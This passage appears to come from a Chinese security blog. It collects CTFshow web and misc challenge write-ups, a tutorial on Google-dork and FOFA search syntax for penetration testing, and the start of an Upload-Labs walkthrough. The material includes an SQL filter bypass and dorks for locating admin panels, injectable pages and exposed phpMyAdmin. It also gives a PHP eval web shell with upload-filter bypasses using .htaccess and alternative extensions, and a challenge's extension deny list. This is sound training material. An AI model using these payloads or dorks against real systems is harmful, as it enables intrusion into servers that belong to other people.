$query=mysqli_query($conn,$sql);执行针对数据库的查询    $result=mysqli_fetch_assoc($query);从结果集中取得一行作为关联数组    if($name===&#39;admin&#39;){        echo &quot;admin!!!!!&quot;.&quot;&lt;br /&gt;&quot;;        if(isset($_GET[&#39;c&#39;])){            preg_replace_callback(&quot;/\w\W*/&quot;,function(){die(&quot;not allowed!&quot;);},$_GET[&#39;c&#39;],1); 函数执行一个正则表达式搜索并且使用一个回调进行替换。            echo $flag;        }else{            echo &quot;you not admin&quot;;        }    }}?&gt;</code></pre><p>打开register.php注册页面</p><pre><code>&lt;html&gt;&lt;head&gt;        &lt;h1&gt;用户注册&lt;/h1&gt;&lt;/head&gt;&lt;body&gt;    &lt;form action=&quot;&quot; method=&quot;POST&quot; /&gt;    &lt;input type=&quot;text&quot; name=&quot;name&quot; /&gt;    &lt;input type=&quot;password&quot; name=&quot;pass&quot; /&gt;    &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>post传参，name为值，与此题目源码第一次判断想对应，name不能为空值，然后开始进行sql数据库的操作，第三部进行判断name是否为admin，同时要通过get传入参数c，利用正则匹配来替换所有字符，也就是就要搜索到字符就要执行函数</p><p>有关正则匹配的知识<br>\w：用于匹配字母，数字或下划线字符；<br>\W：用于匹配所有与\w不匹配的字符；<br>“*”元字符规定其前导字符必须在目标对象中出现零次或连续多次；</p><p>在register.php注册名为admin  的账户，登陆的时候满足c的传值也为空格即可</p><pre><code>http://26e33888-9abc-46aa-a3fc-7700e6f8d41e.chall.ctf.show:8080/?c=   ←空格</code></pre><p>得ctfshow{ba51b604-87e6-48bb-bf13-505edd2e8c08}</p><h1 id="2021-4-14（萌新）"><a href="#2021-4-14（萌新）" class="headerlink" title="2021-4-14（萌新）"></a>2021-4-14（萌新）</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><pre><code> &lt;html&gt;&lt;head&gt;    &lt;title&gt;ctf.show萌新计划web1&lt;/title&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;?php# 包含数据库连接文件include(&quot;config.php&quot;);# 判断get提交的参数id是否存在if(isset($_GET[&#39;id&#39;])){    $id = $_GET[&#39;id&#39;];    # 判断id的值是否大于999    if(intval($id) &gt; 999){        # id 大于 999 直接退出并返回错误        die(&quot;id error&quot;);    }else{        # id 小于 999 拼接sql语句        $sql = &quot;select * from article where id = $id order by id limit 1 &quot;;        echo &quot;执行的sql为：$sql&lt;br&gt;&quot;;        # 执行sql 语句        $result = $conn-&gt;query($sql);        # 判断有没有查询结果        if ($result-&gt;num_rows &gt; 0) {            # 如果有结果，获取结果对象的值$row            while($row = $result-&gt;fetch_assoc()) {                echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;;            }        }        # 关闭数据库连接        $conn-&gt;close();    }}else{    highlight_file(__FILE__);}?&gt;&lt;/body&gt;&lt;!-- flag in id = 1000 --&gt;&lt;/html&gt;</code></pre><p>要求构造id=1000，利用十六进制绕过：</p><p>执行的sql为：select * from article where id = 0x3E8 order by id limit 1<br>id: 1000 - title: CTFshowflag </p><hr><p>ctfshow{5b2f045b-59b4-40b3-9034-c59d7670642c}</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>和一一样，因为正则匹配掉的是or</p><h3 id="web3-4-5-6-7"><a href="#web3-4-5-6-7" class="headerlink" title="web3,4,5,6,7"></a>web3,4,5,6,7</h3><p>二进制可以用，?id=0b1111101000</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow之misc</title>
      <link href="/2021/01/24/ctfshow-zhi-misc/"/>
      <url>/2021/01/24/ctfshow-zhi-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1300994613&auto=1&height=66"></iframe><h1 id="2021-01-24"><a href="#2021-01-24" class="headerlink" title="2021-01-24"></a>2021-01-24</h1><h2 id="大吉大利杯"><a href="#大吉大利杯" class="headerlink" title="大吉大利杯"></a>大吉大利杯</h2><h3 id="请问大吉杯的签到是在这里签吗"><a href="#请问大吉杯的签到是在这里签吗" class="headerlink" title="请问大吉杯的签到是在这里签吗"></a>请问大吉杯的签到是在这里签吗</h3><p>得到二维码1.png</p><p>通过foremost分离得到另外3个</p><p>内容分别是：</p><p>1：请问DJB CTF比赛的签到处在什么地方</p><p>2：还要往前走……是不是在这个路口转弯呢?<br>3：好像没有岔路了，一直往前走试试看<br>4：咦，这是死胡同，是不是哪里走错路了</p><p>关键的地方在2.png，用stegsolve，<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8824%E6%97%A52307_1.png" alt></p><p>得到图案，对比发现是猪圈密码，对照解码得到flag：<br>flag{dajiadoaidjb}</p><h3 id="十八般兵器"><a href="#十八般兵器" class="headerlink" title="十八般兵器"></a>十八般兵器</h3><p>顺序：刀、枪、剑、戟、斧、钺、钩、叉、鞭、锏、锤、戈、镋、棍、槊、棒、矛、耙</p><p>下载得到rar文件，打开得到批注是：2021牛年大吉，这个就是解压密码</p><p>hint1:JPHS<br>hint2:用Notepad++打开试试？<br>hint3:前十种兵器对应10进制，后八种对应8进制</p><p>用jphswin打开，用seek，将棒.jpg保存，得到txt文本，下拉到最后得到34635</p><p>将18个兵器后面藏的数字一次写下来，并且按照题目给的顺序排列。再加上提示说前10个是10进制，后8个是8进制，可以得到两组数字：</p><p>1361 4399 9223 1635 2581 7639 7978 5870 0963 935 30440 53720 46055 62766 10613 34635 37242 30575<br>两组分别合并 得到<br>136143999223163525817639797858700963935<br>3044053720460556276610613346353724230575</p><p>16进制：</p><p>666c61677b43544673686f775f31305f</p><p>62415f42616e5f62316e675f51317d</p><p>666c61677b43544673686f775f31305f62415f42616e5f62316e675f51317d</p><p>16→text：flag{CTFshow_10_bA_Ban_b1ng_Q1}</p><h1 id="2021-02-08"><a href="#2021-02-08" class="headerlink" title="2021-02-08"></a>2021-02-08</h1><h2 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h2><p>伪加密flag{79ddfa61bda03defa7bfd8d702a656e4}</p><h2 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h2><p>hint：偶然发现我竟然还有个软盘，勾起了我的回忆。</p><p>下载得到file文件（没有后缀），可以通过file file命令查看文件类型</p><pre><code>file: DOS/MBR boot sector, code offset 0x4e+2, OEM-ID &quot;CTF.SHOW&quot;, root entries 224, sectors 2880 (volumes &lt;=32 MB), sectors/FAT 9, sectors/track 18, sectors 2880 (volumes &gt; 32 MB), serial number 0xffffffff, label: &quot;flagnothere&quot;, FAT (12 bit by descriptor+sectors), followed by FAT</code></pre><p>dos：磁盘操作系统</p><p>1.44MB软盘使用的FAT文件系统通常为FAT12，根据<a href="https://zhuanlan.zhihu.com/p/121807427" target="_blank" rel="noopener">FAT12的MBR引导记录结构</a>，第54字节开始的8位应固定为FAT12。而该文件中被修改成了FAT11，需要进行修复。<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B402%E6%9C%8808%E6%97%A51923_1.png" alt></p><p>11改为12，31改为32，然后新建虚拟机，载入file软盘镜像文件，启动虚拟机就会得到：flag{ctfshow}</p><h2 id="miscx"><a href="#miscx" class="headerlink" title="miscx"></a>miscx</h2><p>得到加密压缩包，其中有注释：1.2020快乐！2.rat？or？还有未加密文件misc.png，用hxd打开在字符串最后得到flag{flag_1s_n0t_h3r3}但是不是misc1的密码，密码其实是图片本身：2020！得到</p><pre><code>♭‖♭‖‖♯♭♭♬‖♩♫‖♬∮♭♭¶♭‖♯‖¶♭♭‖∮‖‖♭‖§♭‖♬♪♭♯§‖‖♯‖‖♬‖‖♪‖‖♪‖¶§‖‖♬♭♯‖♭♯♪‖‖∮‖♬§♭‖‖‖♩♪‖‖♬♭♭♬‖♩♪‖♩¶‖♩♪‖♩♬‖¶§‖‖♩‖¶♫♭♭♩‖♬♯‖♬§♭‖♭‖♩¶‖‖∮♭♭♬‖‖♭‖♫§‖¶♫‖♩∮♭♭§‖♭§‖♭§§=</code></pre><p>根据特征判断出是音乐符号加密使用<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue" target="_blank" rel="noopener">这个在线加密工具</a>加密的，解密得到：</p><pre><code>U2FsdGVkX1/eK2855m8HM4cTq8Fquqtm6QDbcUu4F1yQpA==</code></pre><p>base64再解码：乱码，无法解码</p><p>提示2：rat？or？</p><p>rabbit再解密（key=2020）：</p><pre><code>welcome_to_payhelp</code></pre><p>（这个payhelp是一个单身交友平台）</p><p>ok开始进攻misc2hint密码就是上面得到的，解开得(base64解密后)：</p><pre><code>welcome_to_2020%0Aflag%20is%20coming...%0Athe%20key%20is%20hello%202020%217</code></pre><p>URL解码得：</p><pre><code>welcome_to_2020flag is coming...the key is hello 2020!</code></pre><p>flag{g00d_f0r_y0u}</p><h2 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h2><p>png文件3.05mb，hxd打开在字符串末尾得到</p><pre><code>Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==</code></pre><p>base64处理：</p><pre><code>JNCVS62MMF5HSX2NMFXH2CQ=</code></pre><p>base32处理：</p><pre><code>KEY{Lazy_Man}</code></pre><p>然后直接后缀改为zip，得到fbi.rar打开得到flag.zip和注释GEZDGNBVGYFA====</p><p>base32处理得到：123456</p><p>输入密码123456得到文本文件：thienc.txt|打开得到10.3M的数字，且3078重复出现，3078进行16进制解码后得到0x也就是说都是16进制编码，于是需要：批量删除0x，将剩下的转换为16进制，又因为3337==&gt;37,3761==&gt;7a</p><pre><code> {&quot;扩展名&quot;:&quot;7z&quot;,&quot;文件头标识（HEX）&quot;:&quot;377ABCAF271C&quot;,&quot;文件描述&quot;:&quot;7-ZIPcompressedfile&quot;}</code></pre><p><a href="https://zhuanlan.zhihu.com/p/158980459" target="_blank" rel="noopener">点击此处查看更多</a>文件头</p><p>也就是说最后要变为7z的压缩包，大佬脚本（此脚本可一步到位得到的test.txt以16进制文本的形式粘贴到010然后保存格式为）：</p><pre><code>import redef read_file(filepath):    with open(filepath) as fp:        content=fp.read();    return contentnumber = read_file(&#39;1.txt&#39;)result = []result.append(re.findall(r&#39;.{2}&#39;, number))result = result[0]strings =&#39;&#39;for i in result:    y = bytearray.fromhex(i)    z = str(y)    z= re.findall(&quot;b&#39;(.*?)&#39;&quot;,z)[0]    strings += zb= strings.split(&#39;0x&#39;)strings=&#39;&#39;for i in b:    if len(i) ==1:        i= &#39;0&#39; + i    strings +=iwith open(&#39;test.txt&#39;, &#39;w&#39;) as f:    f.write(strings)</code></pre><p>得带的7z压缩包解压密码：KEY{Lazy_Man}</p><p>用base3件套脚本跑失败。</p><p>转用脚本针对32和64的循环解码脚本（坑：脚本名字不可以和你要导入的模板重名，否则会导入失败）</p><p>这里用base64和32件套的脚本原因是针对开头部分加密字符串进行解密然后判断，以下是脚本（亲测可行）：</p><pre><code>import base64import ref = open(&#39;C:/Users/Administrator/Desktop/secenc.txt&#39;).read().encode(&#39;utf-8&#39;)while True:    if re.match(&#39;^[2-7A-Z=]+$&#39;, f.decode(&#39;utf-8&#39;)):        f = base64.b32decode(f)    elif re.match(&#39;^[0-9a-zA-Z+/=]+$&#39;, f.decode(&#39;utf-8&#39;)):        f = base64.b64decode(f)    else:        print(f.decode(&#39;utf-8&#39;))        break</code></pre><p>得到以！.？组成的加密文件，是简化形式的Ook!，在线工具运行得到（无删减）：</p><pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;.&lt; +++[- &gt;+++&lt; ]&gt;+++ ++.+++++++ .---- ----- .&lt;+++ ++++[ -&gt;--- ----&lt; ]&gt;--. &lt;++++ +++[- &gt;++++ +++&lt;]&gt;++++ +++++ +++.- ----- --.-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt; +++++ .&lt;+++ +++[-&gt;---- --&lt;]&gt; -.&lt;++ ++[-&gt; ++++&lt; ]&gt;.++ ++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.&lt;+ +++[-&gt;++++ &lt;]&gt;++ .---- ---.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- ----- -.&lt;++ +++++ [-&gt;+++++++ &lt;]&gt;++ ++.++ +++++ .++++ ++++. &lt;++++ +++++ [-&gt;-- ----- --&lt;]&gt; -----.&lt;+++ +++++ +[-&gt;+ +++++ +++&lt;] &gt;++++ +++++ ++.&lt;</code></pre><p>brainfuck解码：flag{Welc0me_tO_cTf_3how!}</p><p>题外话：不得不说，ctfshow的misc比buuctf有搞头</p><h1 id="2021-02-09"><a href="#2021-02-09" class="headerlink" title="2021-02-09"></a>2021-02-09</h1><h2 id="misc30"><a href="#misc30" class="headerlink" title="misc30"></a>misc30</h2><p>rar压缩包内三个文件</p><p>先从未加密的星空jpg开始，右键属性，详细信息得到：</p><pre><code>little stars</code></pre><p>解开眼见不一定为实.doc的密码，里面是word隐写，全选后改变颜色字体得到：</p><pre><code>你知道梵高的星空吗？Hello friend!</code></pre><p>利用其解开flag.png得到二维码利用软件cqr得到flag{welcome_to_ctfshow}</p><h2 id="stega1"><a href="#stega1" class="headerlink" title="stega1"></a>stega1</h2><p>题如其名stego隐写（failed）</p><p>winhex（failed）</p><p>jphs中的seek(success)：密码为空，保存文件为txt</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p><strong>密文：zse4rfvsdf 6yjmko0</strong></p><p><strong>提示1：解密后两个字符,小写 提示2：看看自己下面</strong></p><p><strong>提交flag{明文}</strong></p><p>键盘密码：av</p><h2 id="misc40"><a href="#misc40" class="headerlink" title="misc40"></a>misc40</h2><p>加密文件：svega.wav</p><p>未加密文件：svega.mp3，conversion.txt，一张普通的二维码.png</p><p>conversion.txt利用过程：</p><p>文本内容：</p><pre><code>1100010101000111012&gt;4&gt;8&gt;10</code></pre><p>看最后一行应该是2进制转4转8转10，2直接转10就行得到结果：202013，使mp3可以解码</p><p>二维码利用过程：</p><p>winhex打开得到brainfuck加密，解码得：</p><p>和谐民主和谐文明和谐和谐和谐自由和谐平等和谐公正</p><p>再解码得：123456，但是没用上。</p><p>MP3利用过程：</p><p>考虑得到的mp3，使用mp3stego后得到文件：svega.mp3.pcm</p><pre><code>选项:-X 提取隐藏数据-P&lt;text&gt; 用于嵌入的密码短语-A 写一个AIFF输出的脉码调制声音文件-s &lt;sb &gt; 仅适用于此sb(仅调试)inputBS 输入编码音频的输入比特流outPCM 输出PCM输出PCM声音文件(dflt inputBS+.aif|.pcm)outhidden 输出隐藏文本文件(dflt inputBS+.txt)</code></pre><p>这里需要-P 123456不然只会得到svega.mp3.pcm：</p><pre><code>hint：静默之眼对了~另一个音乐的密码是abc123哦你马上就成功了！</code></pre><p>咱也不知道静默之眼是什么东西。。。原来叫sileneye隐写工具，根据进制转换得到的密码202013解密wav文件：flag{C0ngr4tul4ti0n!}</p><h1 id="2021-02-10"><a href="#2021-02-10" class="headerlink" title="2021-02-10"></a>2021-02-10</h1><h2 id="misc30-1"><a href="#misc30-1" class="headerlink" title="misc30"></a>misc30</h2><p>得到aihe.mp3，mp3stego尝试（凉），foremost跑一些得到图片，修改高度，得到猪圈密码，解密得：well done</p><p>flag{well done}</p><h2 id="红包题第一弹"><a href="#红包题第一弹" class="headerlink" title="红包题第一弹"></a>红包题第一弹</h2><p>打开得到86个zip文件，直接86个图片，尝试解压几张图片，并用十六进制编辑器查看，发现末尾均有额外数据，基本就是base64。</p><p>脚本介绍：按文件名顺序依次将压缩包解压得到图片，并提取图片末尾的字符串后拼接：</p><pre><code>import zipfilepath1 = &#39;C:/Users/Administrator/Desktop/flag/&#39;path2 = &#39;C:/Users/Administrator/Desktop/flag/out/&#39;res = &#39;&#39;for i in range(1, 87):    zip = zipfile.ZipFile(path1 + str(i) + &#39;.zip&#39;)    jpg = str(i) + &#39;.jpg&#39;    zip.extract(jpg, path2)    zip.close()    f = open(path2 + jpg, &#39;rb&#39;).read()    res += f[len(f)-100:len(f)+1].decode(&#39;utf-8&#39;)print(res)</code></pre><p><strong>关于base64编码的图片base64的开头为iVBOR…</strong>此处就是，所以文件头就加上<strong>data:image/png;base64,</strong>然后base64转图片得到二维码得：flag{gif_is_so_easy}</p><h2 id="stega10"><a href="#stega10" class="headerlink" title="stega10"></a>stega10</h2><p>得到文件heart.jpg，winhex或者用命令strings heart.jpg得：aHR0cHM6Ly93d3cubGFuem91cy5jb20vaTliMGtzZA</p><p>base64解码处理：</p><p><a href="https://www.lanzous.com/i9b0ksd" target="_blank" rel="noopener">https://www.lanzous.com/i9b0ksd</a></p><p>下载得到压缩包，其中密码文件夹内包含9个1字节长的txt文件，通过CRC32爆破的方法得到9个txt文件的内容：</p><pre><code>import zipfileimport stringimport binasciicrc = []zip = zipfile.ZipFile(&#39;C:/Users/Administrator/Desktop/flag.zip&#39;, &#39;r&#39;)for i in zip.namelist():    crc += [zip.getinfo(i).CRC]crc = crc[1:10]for i in range(9):    for j in string.printable:        c = binascii.crc32(j.encode(&#39;utf-8&#39;))        if c == crc[i]:            print(j, end = &#39;&#39;)</code></pre><p>得到：447^*5#)7</p><p>作为密码输入得到n.png，winhex打开，发现文件被倒着写了，脚本：</p><pre><code>f = open(&#39;C:/Users/Administrator/Desktop/n.png&#39;, &#39;rb&#39;).read()res = open(&#39;C:/Users/Administrator/Desktop/n2.png&#39;, &#39;wb&#39;)res.write(f[::-1])</code></pre><p>得到二维码扫码得到：flag{我好难啊}</p><h2 id="stega11"><a href="#stega11" class="headerlink" title="stega11"></a>stega11</h2><p>常规知识普及一下<br>jpg的文件头，FF D8<br>jpg的文件尾, FF D9</p><p>我们搜索FF D9，在第一个结果后，发现base32密文：</p><pre><code>MZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2</code></pre><p>base32解码得：</p><p>flag{6f1797d4080b29b64da5897780463e30}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> CTFshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搜索语法</title>
      <link href="/2021/01/18/sou-suo-yu-fa/"/>
      <url>/2021/01/18/sou-suo-yu-fa/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1808492017&auto=1&height=66"></iframe><h1 id="一、谷歌语法是什么"><a href="#一、谷歌语法是什么" class="headerlink" title="一、谷歌语法是什么"></a>一、谷歌语法是什么</h1><p>谷歌语法就是利用搜索引擎在渗透测试过程搜索到特定页面的一种语法</p><h1 id="二、如何利用谷歌语法"><a href="#二、如何利用谷歌语法" class="headerlink" title="二、如何利用谷歌语法"></a>二、如何利用谷歌语法</h1><h2 id="谷歌语法基础的符号："><a href="#谷歌语法基础的符号：" class="headerlink" title="谷歌语法基础的符号："></a>谷歌语法基础的符号：</h2><p><strong>“xxx”: 将要搜索的关键字用引号括起来  (表示完全匹配，即关键词不能分开，顺序也不能变)</strong></p><p>例如：腾讯课堂如果不加“ ”的话，就会针对腾讯和课堂进行拆分，既对腾讯进行搜索也对课堂进行搜索，所以加上“ ”的话就会对腾讯课堂进行绑定，只对腾讯课堂进行搜索</p><p><strong>+：“xxx” +baidu.com</strong> </p><p>  <strong>搜索xxx与baidu.com 相关的内容</strong></p><p>例如：腾讯课堂 +ke.qq.com，那么这里就会显示ke.qq.com相关的内容</p><p><strong>-：“xxx” -baidu.com</strong> </p><p>  <strong>搜索结果里面除去baidu.com 相关的内容</strong></p><p>例如：腾讯课堂 -ke.qq.com，这里再搜索的时候，就会把这个网址屏蔽掉</p><h2 id="谷歌语法的基础使用"><a href="#谷歌语法的基础使用" class="headerlink" title="谷歌语法的基础使用"></a>谷歌语法的基础使用</h2><p>在渗透测试的过程中，运用谷歌语法能快速地帮我们找到可能存在漏洞的页面</p><h3 id="谷歌语法常用搜索参数："><a href="#谷歌语法常用搜索参数：" class="headerlink" title="谷歌语法常用搜索参数："></a>谷歌语法常用搜索参数：</h3><h4 id="site："><a href="#site：" class="headerlink" title="site："></a>site：</h4><p>指定域名，如：site:edu.cn 搜索教育网站</p><h4 id="inurl："><a href="#inurl：" class="headerlink" title="inurl："></a>inurl：</h4><p>用于搜索包含的url关键词的网页，如：inurl:uploads 文件上传，搜索关于公司有关的网址中含有login的网页，</p><h4 id="intitle："><a href="#intitle：" class="headerlink" title="intitle："></a>intitle：</h4><p>搜索网页标题中的关键字，如：</p><p>intitle:”index of /admin” robots.txt </p><p>intitle:”robots.txt”</p><h4 id="intext："><a href="#intext：" class="headerlink" title="intext："></a>intext：</h4><p>搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码</p><h4 id="filetype："><a href="#filetype：" class="headerlink" title="filetype："></a>filetype：</h4><p>按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp</p><h4 id="cache："><a href="#cache：" class="headerlink" title="cache："></a>cache：</h4><p>已经删除的缓存网页，推荐组合使用</p><h2 id="谷歌语法拓展"><a href="#谷歌语法拓展" class="headerlink" title="谷歌语法拓展"></a>谷歌语法拓展</h2><h3 id="查找后台"><a href="#查找后台" class="headerlink" title="查找后台"></a>查找后台</h3><p>site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐号|admin|login|sys|managetem|password|username </p><p>site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user</p><h3 id="查找sql注入漏洞"><a href="#查找sql注入漏洞" class="headerlink" title="查找sql注入漏洞"></a>查找sql注入漏洞</h3><p>inurl:.php?id=23 公司</p><p>inurl:.asp?id=11</p><h3 id="查找上传点："><a href="#查找上传点：" class="headerlink" title="查找上传点："></a>查找上传点：</h3><p>site:xx.com inurl:file| uploadfile</p><h3 id="查找敏感信息泄露"><a href="#查找敏感信息泄露" class="headerlink" title="查找敏感信息泄露"></a>查找敏感信息泄露</h3><p>intitle:”Index of /admin”</p><p>intitle:”Index of /root”</p><p>intitle:”Index of /“ +password.txt</p><p>intitle:phpinfo()或者inurl:phpinfo.php</p><h3 id="查找未授权访问phpmyadmin"><a href="#查找未授权访问phpmyadmin" class="headerlink" title="查找未授权访问phpmyadmin"></a>查找未授权访问phpmyadmin</h3><p>inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin</p><h2 id="三、网络空间搜索引擎的使用"><a href="#三、网络空间搜索引擎的使用" class="headerlink" title="三、网络空间搜索引擎的使用"></a>三、网络空间搜索引擎的使用</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><p>FOFA 是白帽汇推出的一款网络空间搜索引擎,它通过进行网络空间测绘,能够帮助研究人员或者企业迅速进行网络资产匹配,例如进行漏洞影响范围分析、应用分布统计、应用流行度等。</p><p>FOFA 搜索引擎检索到的内容主要是服务器，数据库，某个网站管理后台，路由器，交换机，公共IP的打印机，网络摄像头，门禁系统，Web服务 ……</p><p>网址：<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a></p><h3 id="FOFA怎么用？"><a href="#FOFA怎么用？" class="headerlink" title="FOFA怎么用？"></a>FOFA怎么用？</h3><p>FOFA查询语法，类似谷歌语法，FOFA的语法也是简单易懂，主要分为检索字段以及运算符，所有的查询语句都是由这两种元素组成的。</p><p>常用语法：</p><p>1、domain= “qq.com”    //搜索qq.com所有的子域名</p><p>2、host=”edu.cn”      //从url中搜索edu.cn</p><p>3、ip= “11.1.1.1”     //搜索ip</p><p>4、server=”apache”     //搜索服务是apache的网站</p><p>5、os=”windows”      //搜素操作系统是windows的网站</p><p>6、port=3306 或者 protocol==”mysql” //搜索mysql数据库的网站</p><p>7、app=”致远”    //搜索致远oa办公系统搭建的网站，还可以搜设备，比如监控的</p><p>8、title=”登陆”      //从标题中搜索登陆</p><p>9、header=”thinkphp”    //从http的头里面搜thinkphp</p><p><a href="https://www.aqniu.com/tools-tech/20899.html" target="_blank" rel="noopener">详细使用教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 搜索语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Google </tag>
            
            <tag> fofa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Upload-Labs</title>
      <link href="/2021/01/17/upload-labs/"/>
      <url>/2021/01/17/upload-labs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1433562661&auto=1&height=66"></iframe><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>upload-labs</code>是一个使用<code>php</code>语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h1 id="PASS-01"><a href="#PASS-01" class="headerlink" title="PASS-01"></a>PASS-01</h1><p>问题：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php</p><p>解决：bp抓包，发现抓不到，说明是前端检测</p><pre><code>Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;666.php&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[&#39;666&#39;]);?&gt;</code></pre><p>注意蚁剑连接的时候路径为：/upload/666.php</p><h1 id="PASS-02"><a href="#PASS-02" class="headerlink" title="PASS-02"></a>PASS-02</h1><p>提示：本pass在服务端对数据包的MIME进行检查！</p><p>重点在于<strong>Content-Type: image/jpeg</strong></p><h1 id="PASS-03"><a href="#PASS-03" class="headerlink" title="PASS-03"></a>PASS-03</h1><p>hints：本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！         </p><p>解决(解析漏洞)：用PHP 的别名进行黑名单绕过，如 php2, php3, php4, php5, phps, pht, phtm, phtml</p><h1 id="PASS-04"><a href="#PASS-04" class="headerlink" title="PASS-04"></a>PASS-04</h1><p>.htaccess的设置：</p><pre><code>&lt;FilesMatch &quot;1.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>这里要上传的文件名字为1.jpg</p><h1 id="PASS-05（理论上此关不存在）"><a href="#PASS-05（理论上此关不存在）" class="headerlink" title="PASS-05（理论上此关不存在）"></a>PASS-05（理论上此关不存在）</h1><p>hints：上传目录存在php文件（readme.php）</p><p><a href="https://blog.csdn.net/fdipzone/article/details/39064001" target="_blank" rel="noopener">上传.user.ini文件</a></p><p>php.ini中有两项<br> <strong>auto_prepend_file</strong> 在页面顶部加载文件<strong>auto_append_file</strong>  在页面底部加载文件</p><p>.user.ini文件内容：</p><pre><code>auto_prepend_file=1.jpg</code></pre><p>尚未成功，应该与版本有关</p><h1 id="PASS-06"><a href="#PASS-06" class="headerlink" title="PASS-06"></a>PASS-06</h1><p>查看源码：</p><pre><code>$is_upload = false;$msg = null;if (isset($_POST[&#39;submit&#39;])) {    if (file_exists(UPLOAD_PATH)) {        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&